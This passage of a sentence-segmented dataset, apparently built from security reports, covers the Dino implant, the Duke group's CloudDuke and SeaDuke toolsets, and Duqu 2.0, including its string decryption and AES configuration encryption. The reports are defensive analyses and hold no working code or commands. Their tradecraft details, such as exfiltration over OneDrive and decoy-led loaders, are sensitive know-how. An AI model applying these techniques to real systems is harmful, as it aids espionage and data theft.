implementations accept \" @reboot \" .", "2719": "As an example , here is the output of the \" cronlist \" command after a \" wakeup \" command has been scheduled to run on 7th April 2015 at 15:44 .", "2720": "As we can see , each entry is identified by an \" I d \" , an incrementing hexadecimal number starting at 0xC0 .", "2721": "The purpose of the \" Local \" field remains unclear ( the other possible value being \" l \" ) .", "2722": "The \" Count \" parameter counts the number of times a command has been executed , \" 1 \" indicating the command will be executed only once .", "2723": "Finally , the \" Visibility \" field defines whether the command execution will be reported to the C&C ( the other possible value being \" Silent \" ) .", "2724": "The amount of shared code between Dino and known Animal Farm malware leaves very little doubt that Dino belongs to Animal Farm 's arsenal .", "2725": "Among these shared features , we can cite the following .", "2726": "A very similar check ( against \" klavme \" , \" myapp \" , \" TESTAPP \" and \" afyjevmv.exe \" ) is present in Bunny samples , and in some first stage implants deployed by Animal Farm .", "2727": "To hide its calls to certain API functions , Dino employs a classic Animal Farm ploy : a hash is calculated from the function 's name and used to look for the address of the API function .", "2728": "The actual hashing algorithm used in Dino is the same that was used in Casper , namely a combination of rotate left ( ROL ) of 7 bits and exclusive or ( XOR ) operations .", "2729": "The Dino 's custom file system \u2013 the so called ramFS \u2013 is present in several droppers used by Animal Farm .", "2730": "In those binaries the file system serves to set the persistence of the payload .", "2731": "For example , here is the command executed by some NBOT droppers in the context of ramFS .", "2732": "As a final indication that Dino belongs to Animal Farm menagerie , it is noticeable that the output of Dino 's sysinfo command looks like an updated version of the \" beacon \" from the SNOWBALL implant described in the leaked CSE slides \u2013 part of operation SNOWGLOBE , which led to the discovery of Babar .", "2733": "Dino 's sysinfo example output Login / Domain ( owner ) : Administrator / JOHN ( john ) Computer name : JOHN Organization ( country ) .", "2734": "( United States ) RecId : 11173 01 PRS MaxDelay : 3600 Version : 1.2 OS version ( SP ) : 5.1 ( Service Pack 3 ) WOW64 : No Default browser : firefox.exe IE version : Mozilla/4.0 ( compatible\u037e MSIE 7.0\u037e Win32 ) First launch : 04/01/2015 \u2013 18:31:14 Time to kill : N / A Last launch : 04/01/2015 \u2013 19:21:44 Mode : N / A | Rights : Admin | UAC : No ID : 4635BEF0 D89D 11E4 B283 000C 29FD2872 InstallAv : 0 Inj : Yes SNOWBALL implant beacon All these indicators together make us very confident that Dino was developed by the Animal Farm group .", "2735": "Dino adds at least two more indicators to those already documented suggesting that Animal Farm developers are French speaking .", "2736": "Dino 's binary contains a resource whose language code value is 1036 .", "2737": "The original purpose of this language code is to allow developers to provide resources ( menus , icons , version information \u2026 ) for different locations in the world in the corresponding language .", "2738": "Interestingly , when a developer does not manually specify the language code , the compiler sets it to the language of the developer 's machine .", "2739": "So , which language corresponds to the value 1036 , or 0x40c in hexadecimal ? French ( France ) .", "2740": "Of course a non French speaking developer could have deliberately set this value to mislead attribution efforts .", "2741": "But in more recent Animal Farm binaries ( for example Casper ) , this language code has been set to the classical English ( USA ) language code .", "2742": "Therefore , it seems that Animal Farm developers forgot to set this value in their first creations , realized their mistake at some point , and decided to set a standard value .", "2743": "Someone using the language code as a false flag would have likely kept the strategy going .", "2744": "For the record , this Dino sample is not the only Animal Farm binary with 1036 as language code .", "2745": "Dino 's binary is statically linked with the GnuMP library , which is used to manipulate big numbers in cryptography algorithms .", "2746": "The GnuMP code in Dino contains file paths coming from the developer 's machine .", "2747": "As the attentive reader has probably guessed , \" arithmetique \" is the French translation of \" arithmetic \" .", "2748": "Dino 's binary shows an intense development effort , from custom data structures to a homemade file system .", "2749": "As with other Animal Farm binaries , it bears the mark of professional and experienced developers .", "2750": "But Dino also shows a poor knowledge , or interest , from these developers in anti analysis techniques \u2013 contrary to what was seen in Casper \u2013 as demonstrated , for example , by the verbosity of some Dino 's log messages .", "2751": "All those messages provide substantial help in understanding Dino 's internal workings .", "2752": "One will also appreciate the numerous misspellings contained in the messages .", "2753": "Regarding Dino 's victims , we know very little except that they were located in Iran in 2013 .", "2754": "This is in accordance with the victimology described by Canada 's CSE in its presentation .", "2755": "That leads us to the final point of this blog : several signs suggest that Dino 's creators are French speaking developers .", "2756": "These signs add to the pretty long list of indicators already supporting this hypothesis , in particular the ones mentioned by Canada 's CSE .", "2757": "Author Joan Calvet , ESET", "2758": "Recent weeks have seen the outing of two new additions to the Duke group 's toolset , SeaDuke and CloudDuke .", "2759": "Of these , SeaDuke is a simple trojan made interesting by the fact that it 's written in Python .", "2760": "And even more curiously , SeaDuke , with its built - in support for both Windows and Linux , is the first cross - platform malware we have observed from the Duke group .", "2761": "While SeaDuke is a single - albeit cross- platform - trojan , CloudDuke appears to be an entire toolset of malware components , or \" solutions \" as the Duke group apparently calls them .", "2762": "These components include a unique loader , downloader , and not one but two different trojan components .", "2763": "CloudDuke also greatly expands on the Duke group 's usage of cloud storage services , specifically Microsoft 's OneDrive , as a channel for both command and control as well as the exfiltration of stolen data .", "2764": "Finally , some of the recent CloudDuke spear - phishing campaigns have born a striking resemblance to CozyDuke spear - phishing campaigns from a year ago .", "2765": "Last week , both Symantec and Palo Alto Networks published research on SeaDuke , a newer addition to the arsenal of trojans being used by the Duke group .", "2766": "While older malware by the Duke group has always been written with a combination of the C and C++ programming languages as well as assembly language , SeaDuke is peculiarly written in Python with multiple layers of obfuscation .", "2767": "This Python code is usually then compiled into Windows executables using py2exe or pyinstaller .", "2768": "However , the Python code itself has been designed to work on both Windows and Linux .", "2769": "We therefore suspect , that the Duke group is also using the same SeaDuke Python code to target Linux victims .", "2770": "This is the first time we have seen the Duke group employ malware to target Linux platforms .", "2771": "Last week , we also saw Palo Alto Networks and Kaspersky Labs publish research on malware components they respectively called MiniDionis and CloudLook .", "2772": "MiniDionis and CloudLook are both components of a larger malware toolset we call CloudDuke .", "2773": "This toolset consists of malware components that provide varying functionality while partially relying on a shared code framework and always using the same loader .", "2774": "Based on PDB strings found in the samples , the malware authors refer to the CloudDuke components as \" solutions \" with names such as \" DropperSolution \" , \" BastionSolution \" and \" OneDriveSolution \" .", "2775": "A list of PDB strings we have observed is below .", "2776": "The first of the CloudDuke components we have observed is a downloader internally called \" DropperSolution \" .", "2777": "Depending on the way the downloader has been configured , in some cases it may first attempt to log in to Microsoft 's cloud storage service OneDrive and retrieve the payload from there .", "2778": "If no payload is available from OneDrive , the downloader will revert to the previously mentioned method of downloading from compromised websites .", "2779": "We have also observed two distinct trojan components in the CloudDuke toolset .", "2780": "The first of these , internally called \" BastionSolution \" , is the trojan that Palo Alto Networks described in their research into \" MiniDionis \" .", "2781": "Interestingly , BastionSolution appears to functionally be an exact copy of SeaDuke with the only real difference being the choice of programming language .", "2782": "BastionSolution also makes significant use of a code framework that is apparently internally called \" Z \" .", "2783": "This framework provides classes for functionality such as encryption , compression , randomization and network communications .", "2784": "Classes from the same \" Z \" framework , such as the encryption and randomization classes , are also used by the second trojan component of the CloudDuke toolset .", "2785": "To achieve this , OneDriveSolution will attempt to log into OneDrive with a preconfigured username and password .", "2786": "The Duke group has often employed loaders for their malware but unlike the previous loaders they have used , the CloudDuke loader is much more versatile with support for multiple methods of loading and executing the final payload as well as the ability to write to disk and execute additional malware components .", "2787": "CloudDuke spear - phishing campaigns and similarities with CozyDuke CloudDuke has recently been spread via spear - phishing emails with targets reportedly including organizations such as the US Department of Defense .", "2788": "These spear - phising emails have contained links to compromised websites hosting zip archives that contain CloudDuke - laden executables .", "2789": "The first of these files has been a decoy , such as an audio file or a PDF file while the second one has been a CloudDuke loader embedding a CloudDuke downloader , the so - called \" DropperSolution \" .", "2790": "In these cases , the victim has been presented with the decoy file while in the background the downloader has proceeded to download and execute one of the CloudDuke trojans , \" OneDriveSolution \" or \" BastionSolution \" .", "2791": "Interestingly , however , some of the other CloudDuke spear - phishing campaigns we have observed this July have born a striking resemblance to CozyDuke spear - phishing campaigns seen almost exactly a year ago , in the beginning of July 2014 .", "2792": "In both spear - phishing campaigns , the decoy document has been the exact same PDF file , a \" US letter fax test page \" ( 28d29c702fdf3c16f27b33f3e32687dd82185e8b ) .", "2793": "Similarly , the URLs hosting the malicious files have , in both campaigns , purported to be related to eFaxes .", "2794": "It is also interesting to note , that in the case of the CozyDuke - inspired CloudDuke spear - phishing campaign , the downloading and execution of the malicious archive linked to in the emails has not resulted in the execution of the CloudDuke downloader but in the execution of the \" BastionSolution \" component thereby skipping one step from the process described for the other CloudDuke spear - phishing campaigns .", "2795": "Developing even a single multipurpose malware toolset , never mind many , requires time and resources .", "2796": "Therefore it seems logical to attempt to reuse code such as supporting frameworks between different toolsets .", "2797": "The Duke group , however , appear to have taken this a step further with SeaDuke and the CloudDuke component BastionSolution , by rewriting the same code in multiple programming languages .", "2798": "This has the obvious benefits of saving time and resources by providing two malware toolsets , that while similar on the inside , appear completely different on the outside .", "2799": "This way , the discovery of one toolset does not immediately lead to the discovery of the second toolset .", "2800": "The Duke group , long suspected of ties to the Russian state , have been running their espionage operation for an unusually long time and - especially lately - with unusual brazenness .", "2801": "These latest CloudDuke and SeaDuke campaigns appear to be a clear sign that the Duke 's are not planning to stop any time soon .", "2802": "Research and post by Artturi ( @lehtior2 ) F - Secure detects CloudDuke as Trojan : W32/CloudDuke . B and Trojan : W64/CloudDuke . B Samples .", "2803": "Compromised servers used for command and control .", "2804": "Compromised websites used to host CloudDuke .", "2805": "Recent weeks have seen the outing of two new additions to the Duke group 's toolset , SeaDuke and CloudDuke .", "2806": "Of these , SeaDuke is a simple trojan made interesting by the fact that it 's written in Python .", "2807": "And even more curiously , SeaDuke , with its built - in support for both Windows and Linux , is the first cross - platform malware we have observed from the Duke group .", "2808": "While SeaDuke is a single - albeit cross- platform - trojan , CloudDuke appears to be an entire toolset of malware components , or \" solutions \" as the Duke group apparently calls them .", "2809": "These components include a unique loader , downloader , and not one but two different trojan components .", "2810": "CloudDuke also greatly expands on the Duke group 's usage of cloud storage services , specifically Microsoft 's OneDrive , as a channel for both command and control as well as the exfiltration of stolen data .", "2811": "Finally , some of the recent CloudDuke spear - phishing campaigns have born a striking resemblance to CozyDuke spear - phishing campaigns from a year ago .", "2812": "Last week , both Symantec and Palo Alto Networks published research on SeaDuke , a newer addition to the arsenal of trojans being used by the Duke group .", "2813": "While older malware by the Duke group has always been written with a combination of the C and C++ programming languages as well as assembly language , SeaDuke is peculiarly written in Python with multiple layers of obfuscation .", "2814": "This Python code is usually then compiled into Windows executables using py2exe or pyinstaller .", "2815": "However , the Python code itself has been designed to work on both Windows and Linux .", "2816": "We therefore suspect , that the Duke group is also using the same SeaDuke Python code to target Linux victims .", "2817": "This is the first time we have seen the Duke group employ malware to target Linux platforms .", "2818": "Last week , we also saw Palo Alto Networks and Kaspersky Labs publish research on malware components they respectively called MiniDionis and CloudLook .", "2819": "MiniDionis and CloudLook are both components of a larger malware toolset we call CloudDuke .", "2820": "This toolset consists of malware components that provide varying functionality while partially relying on a shared code framework and always using the same loader .", "2821": "Based on PDB strings found in the samples , the malware authors refer to the CloudDuke components as \" solutions \" with names such as \" DropperSolution \" , \" BastionSolution \" and \" OneDriveSolution \" .", "2822": "A list of PDB strings we have observed is below .", "2823": "The first of the CloudDuke components we have observed is a downloader internally called \" DropperSolution \" .", "2824": "Depending on the way the downloader has been configured , in some cases it may first attempt to log in to Microsoft 's cloud storage service OneDrive and retrieve the payload from there .", "2825": "If no payload is available from OneDrive , the downloader will revert to the previously mentioned method of downloading from compromised websites .", "2826": "We have also observed two distinct trojan components in the CloudDuke toolset .", "2827": "The first of these , internally called \" BastionSolution \" , is the trojan that Palo Alto Networks described in their research into \" MiniDionis \" .", "2828": "Interestingly , BastionSolution appears to functionally be an exact copy of SeaDuke with the only real difference being the choice of programming language .", "2829": "BastionSolution also makes significant use of a code framework that is apparently internally called \" Z \" .", "2830": "This framework provides classes for functionality such as encryption , compression , randomization and network communications .", "2831": "Classes from the same \" Z \" framework , such as the encryption and randomization classes , are also used by the second trojan component of the CloudDuke toolset .", "2832": "This second component , internally called \" OneDriveSolution \" , is especially interesting because it relies on Microsoft 's cloud storage service OneDrive as its command and control channel .", "2833": "To achieve this , OneDriveSolution will attempt to log into OneDrive with a preconfigured username and password .", "2834": "The Duke group has often employed loaders for their malware but unlike the previous loaders they have used , the CloudDuke loader is much more versatile with support for multiple methods of loading and executing the final payload as well as the ability to write to disk and execute additional malware components .", "2835": "CloudDuke has recently been spread via spear - phishing emails with targets reportedly including organizations such as the US Department of Defense .", "2836": "These spear - phising emails have contained links to compromised websites hosting zip archives that contain CloudDuke - laden executables .", "2837": "The first of these files has been a decoy , such as an audio file or a PDF file while the second one has been a CloudDuke loader embedding a CloudDuke downloader , the so - called \" DropperSolution \" .", "2838": "In these cases , the victim has been presented with the decoy file while in the background the downloader has proceeded to download and execute one of the CloudDuke trojans , \" OneDriveSolution \" or \" BastionSolution \" .", "2839": "Interestingly , however , some of the other CloudDuke spear - phishing campaigns we have observed this July have born a striking resemblance to CozyDuke spear - phishing campaigns seen almost exactly a year ago , in the beginning of July 2014 .", "2840": "In both spear - phishing campaigns , the decoy document has been the exact same PDF file , a \" US letter fax test page \" ( 28d29c702fdf3c16f27b33f3e32687dd82185e8b ) .", "2841": "Similarly , the URLs hosting the malicious files have , in both campaigns , purported to be related to eFaxes .", "2842": "It is also interesting to note , that in the case of the CozyDuke - inspired CloudDuke spear - phishing campaign , the downloading and execution of the malicious archive linked to in the emails has not resulted in the execution of the CloudDuke downloader but in the execution of the \" BastionSolution \" component thereby skipping one step from the process described for the other CloudDuke spear - phishing campaigns .", "2843": "CloudDuke is not the first time we have observed the Duke group use cloud services in general and Microsoft OneDrive specifically as part of their operations .", "2844": "Earlier this spring we released research on CozyDuke where we mentioned observing CozyDuke sometimes either directly use a OneDrive account to exfiltrate stolen data or alternatively CozyDuke downloading Visual Basic scripts that would copy stolen files to a OneDrive account and sometimes even retrieve files containing additional commands from the same OneDrive account .", "2845": "In these previous cases the Duke group has only used OneDrive as a secondary communication channel but still relied on more traditional C&C channels for most of their actions .", "2846": "It is therefore interesting to note that CloudDuke actually enables the Duke group to rely solely on OneDrive for every step of their operation from downloading the actual trojan , passing commands to the trojan and finally exfiltrating stolen data .", "2847": "By relying solely on 3rd party web services , such as OneDrive , as their command and control channel , we believe the Duke group is trying to better evade detection .", "2848": "Large amounts of data being transferred from an organization 's network to an unknown web server easily raises suspicions .", "2849": "However , data being transferred to a popular cloud storage service is normal .", "2850": "What better way for an attacker to surreptitiously transfer large amounts of stolen data than the same way people are transferring that same data every day for legitimate reasons .", "2851": "( Coincidentally , the implications of 3rd party web services being used as command and control channels is also the subject of an upcoming talk at the VirusBulletin 2015 conference ) .", "2852": "Developing even a single multipurpose malware toolset , never mind many , requires time and resources .", "2853": "Therefore it seems logical to attempt to reuse code such as supporting frameworks between different toolsets .", "2854": "The Duke group , however , appear to have taken this a step further with SeaDuke and the CloudDuke component BastionSolution , by rewriting the same code in multiple programming languages .", "2855": "This has the obvious benefits of saving time and resources by providing two malware toolsets , that while similar on the inside , appear completely different on the outside .", "2856": "This way , the discovery of one toolset does not immediately lead to the discovery of the second toolset .", "2857": "The Duke group , long suspected of ties to the Russian state , have been running their espionage operation for an unusually long time and - especially lately - with unusual brazenness .", "2858": "These latest CloudDuke and SeaDuke campaigns appear to be a clear sign that the Duke 's are not planning to stop any time soon .", "2859": "Research and post by Artturi ( @lehtior2 ) F - Secure detects CloudDuke as Trojan : W32/CloudDuke . B and Trojan : W64/CloudDuke . B Samples .", "2860": "Compromised servers used for command and control .", "2861": "Compromised websites used to host CloudDuke .", "2862": "In October 2011 , we analyzed a new threat what we named Duqu , and we showed that it has close relationships to the infamous Stuxnet attack .", "2863": "By courtesy of Kaspersky Lab , in late May 2015 we received samples about a new threat , with the hint that it might be related to the Duqu attacks ; however , these new samples are from 2014 .", "2864": "We decided to carry out an individual research on the samples with the focus on the connections between the original Duqu attack and the new threat , dubbed \" Duqu 2.0 \" .", "2865": "After analyzing the samples received , we think , that the adversaries behind Duqu malware are back and active ; while they modified their tools to be undetected by old methods , they also strongly reused codes and ideas during their recent attacks .", "2866": "The numerous similarities that we discovered between Duqu and Duqu 2.0 include the following .", "2867": "In this report , we present supporting details and analysis for all the similarities listed above .", "2868": "Stuxnet is probably the most well - known malware of our times .", "2869": "Its fame stems from the facts that it targeted a very specific industrial facility , namely a uranium enrichment plant in Iran , it aimed at physical destruction of uranium centrifuges , and it apparently accomplished its mission successfully .", "2870": "In addition to all these characteristics , IT security experts also appreciate its technical sophistication and the zero - day exploits that it used .", "2871": "Stuxnet was also an alarm to the developed world : it shed light on the capabilities of advanced attackers , and at the same time , on the numerous weaknesses of our computing infrastructure .", "2872": "Putting these two together , people started to feel hopelessly vulnerable .", "2873": "Yet , unfortunately , Stuxnet is not a unique example for a highly sophisticated targeted threat , but there are numerous other pieces of malware of similar kind , including Duqu , Flame , Regin , etc .", "2874": "Among those , Duqu is particularly interesting , not only because we discovered it back in 2011 , but because our analysis pointed out that - while Duqu 's objective is different - it has very strong similarities to Stuxnet in terms of architecture , code , and methods to achieve stealthiness .", "2875": "Today , it is widely believed within the IT security community that Duqu was created by the same attackers who created Stuxnet .", "2876": "And now we have a new member of the same family ! Last month , we received interesting samples from Kaspersky Lab with a hint that they might be related to the Duqu samples of 2011 ; however , these new samples are from 2014 .", "2877": "Our common understanding was that it would be interesting to figure out whether this new threat is indeed related to the old Duqu attack , and we in the CrySyS Lab should try to focus our analysis efforts on answering this question .", "2878": "It is important to emphasize that we did our analysis independently from Kaspersky Lab : we did not read their preliminary report and they did not share any of their findings with us ( apart from the samples that we received from them ) .", "2879": "The analysis results performed by Kaspersky Lab can be read in the following report .", "2880": "https://securelist.com / blog / research/70504/the - mystery - of - duqu- 2 - 0-a - sophisticated - cyberespionage - actor - returns/ In this report , we present the results of our comparative analysis of the old version of Duqu and the new version , codenamed \" Duqu 2.0 \" .", "2881": "We concentrate on the description of the relevant similarities and differences we have found between the two malware samples .", "2882": "In the table below , one can see the MD5 fingerprints of the two samples we have examined during our initial analysis .", "2883": "The first module will be referenced in this document with the name \" c7c647 \" , and the second with the name \" 3f52ea \" according to the prefix of their MD5 hashes .", "2884": "In the following chapter , we will discuss the most conspicuous similarities and differences we have found between the main modules of Duqu and Duqu 2.0 .", "2885": "Both the two main modules of Duqu 2.0 we have analyzed ( \" c7c647 \" and \" 3f52ea \" ) has 6 export functions which can be seen in the following figure .", "2886": "The new sample ( both versions ) is one big executable file that is linked by multiple modules .", "2887": "The original Duqu had a main module that was divided into two sub - modules : an outside layer and an internal part .", "2888": "In one version , the internal part was stored in a specific compressed format , while in another version , which we investigated at a Duqu victim , it was stored in cleartext in a resource data section of the main executable .", "2889": "The Duqu 2.0 version we investigated is different : everything is incorporated in the main executable , but there are still visible marks showing that the malware is linked / compiled from multiple different parts , modules .", "2890": "The actual routine used is printed below .", "2891": "The decompiled version of the above assembly code can be seen in the following sample .", "2892": "The above string decryptor routine is a simple XOR decoder .", "2893": "It simply XORs consecutive 4-byte blocks of the encrypted string buffer , given by its pointer in the first parameter of the function , with a fixed 4-byte key ( \" 0x86F186F1 \" ) .", "2894": "After the decryption of all consecutive 4- byte blocks , the actual cleartext block is stored within the next 4 bytes of the output buffer , pointed by parameter \" a2 \" .", "2895": "The decrypted ( cleartext ) string is terminated with a \" \\0 \" character , and if the decryptor cycle reaches the end of the ( cleartext ) string , the cleartext string will be pointed by the address stored in output argument \" a2 \" .", "2896": "A closer look at the above C code reveals that the string decryptor routine actually has two parameters : \" encrstr \" and \" a2 \" .", "2897": "First , the decryptor function checks if the input buffer ( the pointer of the encrypted string ) points to a valid memory area ( i.e. , it does not contain NULL value ) .", "2898": "After that , the first 4 bytes of the encrypted string buffer is XORed with the key \" 0x86F186F1 \" and the result of the XOR operation is stored in variable \" result \" .", "2899": "The first DWORD ( first 4 bytes ) of the output buffer a2 is then populated by this resulting value ( * ( _ DWORD * ) a2 = result ; ) .", "2900": "Therefore , the first 4 bytes of the output buffer will contain the first 4 bytes of the cleartext string .", "2901": "If the first two bytes ( first WORD ) of the current value stored in variable \" result \" contain ' \\0 ' characters , the original cleartext string was an empty string and the resulting output buffer will be populated by a zero value , stored on 2 bytes .", "2902": "If the first half of the actual decrypted block ( \" result \" variable ) contains something else , the decryptor routine checks the second half of the block ( \" if ( ! * ( _ WORD * ) ( a2 + 2 ) ) \") .", "2903": "If this WORD value is NULL , then decryption will be ended and the output buffer will contain only one Unicode character with two closing ' \\0 ' bytes .", "2904": "If the first decrypted block doens't contain zero character ( generally this is the case ) , then the decryption cycle continues with the next 4-byte encrypted block .", "2905": "The pointer of the output buffer is incremeted by 4 bytes to be able to store the next cleartext block ( \" a2 + = 4 ; \" ) .", "2906": "After that , the following 4-byte block of the \" ciphertext \" will be decrypted with the fixed decryption key ( \" 0x86F186F1 \" ) .", "2907": "The result is then stored within the next 4 bytes of the output buffer .", "2908": "Now , the output buffer contains 2 blocks of the cleartext string .", "2909": "The condition of the cycle checks if the decryption reached its end by checking the first half of the current decrypted block .", "2910": "If it did not reached the end , then the cycle continues with the decryption of the next input blocks , as described above .", "2911": "Before the decryption of each 4-byte \" ciphertext \" block , the routine also checks the second half of the previous cleartext block to decide whether the decoded string is ended or not .", "2912": "The original Duqu used a very similar string decryption routine , which we printed in the following figure below .", "2913": "We can see that this routine is an exact copy of the previously discussed routine ( variable \" a1 \" is analogous to \" encrstr \" argument ) .", "2914": "The only difference between the Duqu 2.0 and Duqu string decryptor routines is that the XOR keys differ ( in Duqu , the key is\"0xB31FB31F \" ) .", "2915": "We can also see that the decompiled code of Duqu contains the decryptor routine in a more compact manner ( within a \" for \" loop instead of a \" while \" ) , but the two routines are essentially the same .", "2916": "For example , the two boundary checks in the Duqu 2.0 routine ( \" if ( ! * ( _ WORD * ) ( a2 + 2 ) ) \" and \" while ( ( _ WORD)result ) ; \" ) are analogous to the boundary check at the end of the \" for \" loop in the Duqu routine ( \" if ( ! ( _ WORD)v4 || ! * ( _ WORD * ) ( result + 2 ) ) \") .", "2917": "Similarly , the increment operation within the head of the for loop in the Duqu sample ( \" result + = 4 \" ) is analogous to the increment operation \" a2 + = 4 ; \" in the Duqu 2.0 sample .", "2918": "This configuration file is encrypted using the AES block cipher in CBC mode with a CTS - like ( Ciphertext Stealing ) encryption of the last two cleartext blocks .", "2919": "The format of the configuration file will be discussed in details in the next chapter .", "2920": "Before the encryption of the configuration file , an AES wrapper object is created .", "2921": "This C++ object represents the context ( parameters ) of the encryption .", "2922": "Therefore , it also stores the initialization vector ( IV ) of the encryption , the key of the cipher and the data to be encrypted .", "2923": "The structure of this object 's class can be seen in the upper part of the next screenshot .", "2924": "As we can see , the allocated memory area of an instance of the \" aeswrapper \" structure ( class ) starts with a 16 bytes ( 128 bits ) IV value ( of course , the size of the IV equals the size of an AES input block ) .", "2925": "It is followed by a 516-byte buffer ( or other unused smaller attributes ) which can store the encryption key of the AES cipher .", "2926": "Size of this encryption key can be either 128 , 192 or 256 bits ( 16 , 24 or 32 bytes ) .", "2927": "The last 4 bytes of the \" aeswrapper \" structure contains the pointer to the data to be encrypted .", "2928": "In addition to the attributes ( IV , encryption key , pointer to a data buffer ) , the \" aeswrapper \" class also contains methods .", "2929": "The most important methods are the \" encrypt \" and \" initialize \" functions .", "2930": "As the name shows , the initialize method initializes the context ( parameters ) of the encryption , therefore it sets the IV , key and data members of the \" aeswrapper \" object .", "2931": "The IV is generated by \" hand \" , but the key is prepared from an initial key using the prepare_key function .", "2932": "The encrypt method encrypts the data in the modified CBC - CTS- like mode .", "2933": "The method uses an AES encryptor function .", "2934": "The nth_block method of the class gives back a pointer to the n - th block of the data to be encrypted .", "2935": "Finally , the \" aeswrapper \" class uses the last_block function to perform the CTS - like encryption mechanism at the end .", "2936": "The function gives back a pointer not to the last partial ( smaller than 16 bytes ) input block , but to the last 16 bytes of the input data buffer .", "2937": "The implementation of AES prepare_key and encrypt methods are presumably copied from function libraries .", "2938": "The figure above shows the structures ( structures of class instances ) which we identified and which are related to the encryption routine and the AES initialization , and the putative attributes of these structures ( classes ) .", "2939": "Using these structures , the disassembled code can be more readable .", "2940": "There is another structure in addition to the \" aeswrapper \" class called \" aes \" on the screenshot above .", "2941": "An instance of this class represents an AES encryptor object .", "2942": "It has probably 3 attributes : key_schedule , precomputed and iteration_count .", "2943": "In the following table , we can see the AES initialization routine ( of the configuration file encryption ) of the old Duqu ( on the left ) and the new Duqu 2.0 sample ( on the right ) at assembly code level .", "2944": "The decompiled code of the initialization function ( for both malware samples ) can be seen in figure Sample 6 .", "2945": "The AES initialization function initializes the mentioned \" aeswrapper \" object , it sets the data buffer , prepares the encryption key , and finally , generates the IV based on the magic constant .", "2946": "Duqu \" netp \" routine Duqu 2.0 \" c7c64 \" routine In both cases , the highlighted part of the assembly code corresponds to the highlighted part of the initialization routines in the decompiled versions of the code , which can be seen in figure Sample 6 .", "2947": "The only difference between the highlighted parts is the values of the magic constants ( \" 0xDEADBABE \" vs.", "2948": "\" 0x248561EF \" ) which are used for the generation of the 128-bit initialization vectors .", "2949": "The mentioned AES initialization routines ( and also the common encryption function ) will be discussed later in this section in more details .", "2950": "We also reverse engineered the encryption routine used by Duqu 2.0 , which is illustrated in the following block diagram .", "2951": "With the exception of the last two input blocks , consecutive blocks of the cleartext data are encrypted with the AES encryption algorithm in CBC mode .", "2952": "Accordingly , the first block of the input data ( \" P[0 ] \" ) is XORed with a fixed initialization vector ( named as \" Fixed IV \" in the figure above ) .", "2953": "This 128-bit initialization vector ( IV ) differs between the old Duqu and the new Duqu 2.0 samples .", "2954": "The value of this IV is generated from a magic constant , as it can be seen in the highlighted parts of the previous assembly code .", "2955": "As this magic constant is different in the old and new samples , the generated IV will also be different .", "2956": "The result of the previously mentioned XOR operation gives the first input block of the AES encryption algorithm ( \" AES-256 \" is in use ) .", "2957": "The number 256 means that the AES algorithm has 256-bit key size .", "2958": "The block size of the AES cipher is constant 128 bits ( 16 bytes ) .", "2959": "\" E[0 ] \" is the first output of the block cipher , so it will be the first encrypted block ( \" F[0 ] \" ) .", "2960": "Output of the block cipher ( \" E[0 ] \" ) is then XORed with the second input block ( \" P[1 ] \" ) , and the resulting block will be encrypted with AES-256 .", "2961": "This procedure continues until the encryption of the last but first block of the cleartext data .", "2962": "If the size of the input data is an integer multiple of the block size of AES ( i.e. , 128 bits ) , then the remaining last two blocks of the cleartext are encrypted in the same manner as the previous input blocks .", "2963": "So , in this case , the whole encryption routine matches a simple CBC mode encryption .", "2964": "However , if the size of the input data is not an exact multiple of the AES block size , the last partial block of the input data needs padding to be completed to a full block .", "2965": "In case of Duqu 2.0 , the developers of the malware did n't use padding in a traditional way .", "2966": "Instead , they use a CTS - like ( Ciphertext Stealing ) method .", "2967": "The essence of the method used by the encryption routine is that a part of the last but first block of the input data is encrypted twice using AES .", "2968": "The last but first block ( \" P[n-1 ] \" ) of the cleartext data is XORed with the previous ciphertext block ( \" E[n-2 ] \" ) and encrypted with AES-256 as previously .", "2969": "The result of this operation is the \" E[n-1 ] \" output block .", "2970": "The \" E[n-1 ] \" output block wo n't be directly used as the ( n-1)st ciphertext block .", "2971": "Instead , the output \" E[n-1 ] \" is splitted into two distinct parts : \" F[n-1 ] \" and another part which is then fed into the AES encryptor again .", "2972": "The last cleartext partial block ( \" P[n ] \" ) \u2013 which has size less than 16 bytes \u2013 is completed from its beginning to get a full AES input block .", "2973": "The data used for completing the last partial block is taken from the end of the previous AES output block ( \" E[n-1 ] \" ) .", "2974": "The resulting block will be fed into the AES-256 cipher in the last step of the encryption process .", "2975": "The output of the last invocation of the AES cipher will be the last ciphertext block ( \" F[n ] \" ) .", "2976": "The output of the last but first invocation of the AES encryptor ( \" E[n-1 ] \" ) is split into two parts , and the first part of size size_of_the_last_cleartext_block will be the ( n-1)st ciphertext block ( \" F[n- 1 ] \" ) .", "2977": "The old Duqu samples used exactly the same encryption method .", "2978": "The decompiled code of the AES encryptor of Duqu can be seen in the following sample , and one can see that this code implements the method we have just explained and illustrated in the block diagram of Figure 8 .", "2979": "The next table compares the AES initialization routines of the old Duqu sample ( upper part of the table ) and the main module of Duqu 2.0 ( lower part of the table ) .", "2980": "First , the initialization routine copies the pointer of the input data buffer into the \" data \" member of the \" aeswrapper \" object .", "2981": "The routine takes this pointer as its second parameter .", "2982": "The first parameter is the pointer ( reference ) of the object instance , since in C++ , the first ( hidden ) parameter of a ( non - static ) class method is always the pointer of the object , or in other words , the \" this \" pointer .", "2983": "In case of Duqu 2.0 , the routine has a third parameter , the pointer to the buffer containing the key .", "2984": "After that , the content of the \" key \" buffer ( which is a global buffer in the first case ) is copied into the local \" key _ \" buffer in both cases .", "2985": "Then the prepare_key method of the AES object prepares the final encryption key based on this key , and feeds it into the \" aeswrapper \" object .", "2986": "Invocation of the prepare_key method can also be seen in the assembly view ( see Sample 4 . ) , the method is referred by the name AES1_sub_2F9B1 in case of Duqu and AES_1_sub_1001690A in case of Duqu 2.0 .", "2987": "In the Duqu 2.0 case , the function has one more parameter , as this can also be seen in the assembly view , and the length of the AES key is chosen as 256 bits .", "2988": "Finally , the remaining part of the code initializes the IV member of \" aeswrapper \" object .", "2989": "Every byte of the IV is generated by XORing the index of the actual byte with a magic constant ( \" 0xDEADBABE \" and \" 0x248561EF \" , respectively , in the two cases ) .", "2990": "Byte index starts from zero .", "2991": "As we can see , there are only three small differences between the routines : the magic constants used by the IV generation , the fact that in Duqu the key is a constant global variable with fixed value while in Duqu 2.0 it is an argument of the initialization function , and finally , the possible length of the key .", "2992": "In case of Duqu , the prepare_key function assumes that the key is always 256 bits , while in case of Duqu 2.0 , the prepare_key function takes the key length as an argument .", "2993": "Key length can be 128 , 192 or 256 bits .", "2994": "Under the encryption layer ( which is identical in the new and old samples as described in the previous section ) , the configuration file format of the new Duqu 2.0 samples is very similar to the old Duqu config file format .", "2995": "For an overview , see Figure 5 